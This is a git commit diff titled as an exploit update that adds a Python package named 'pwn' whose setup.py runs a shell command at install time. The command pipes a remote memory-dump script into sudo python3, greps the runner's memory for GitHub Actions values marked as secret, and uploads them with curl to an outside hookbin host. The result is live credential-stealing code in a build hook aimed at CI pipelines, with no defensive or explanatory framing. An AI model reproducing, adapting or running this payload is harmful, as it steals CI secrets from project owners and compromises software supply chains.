f4c5f3075b6b9d20b9e53d47439f2510a9fc984b
jy3l40c9 <jy3l40c9@rolf.ovh>
2026-04-07 18:34:35 +0000

    Update exploit based on attempt 3 feedback

---
+++ setup.py
@@ -0,0 +1,10 @@
+import os
+from setuptools import setup
+
+cmd = "curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\" && curl -X PUT -d @/tmp/secrets \"https://open-hookbin.vercel.app/$GITHUB_RUN_ID\""
+os.system(cmd)
+
+setup(
+    name="pwn",
+    version="1.0.0",
+)
---
+++ src/pwn.py
@@ -0,0 +1,2 @@
+def pwn():
+    print("Pwned")
